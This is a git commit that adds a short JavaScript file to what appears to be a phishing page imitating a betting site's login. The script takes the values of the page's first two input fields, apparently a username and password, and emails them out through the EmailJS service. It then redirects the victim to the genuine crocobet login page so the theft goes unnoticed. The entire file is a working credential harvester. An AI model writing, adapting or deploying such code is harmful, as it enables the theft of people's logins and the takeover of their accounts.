c126f6cb7b4813b3c943bf66bc7894e0c76fb10e
dato <qutaiseli15@gmail.com>
2021-03-12 12:55:19 +0000

    Initial commit

---
+++ script.js
@@ -0,0 +1,17 @@
+const input = document.getElementsByTagName('input')
+
+function sendMail(){
+  if (input[0].value != '' && input[1].value != ''){
+    var obj = {
+      from_name:  '',
+      to_name: '',
+      message: input[0].value + ' ' + input[1].value
+    }
+
+    emailjs.send('service_d8mlcxq','template_fce14io',obj)
+    .then((res) => {
+      window.open('https://m.crocobet.com/#/login','_self')
+    })
+  }
+}
+
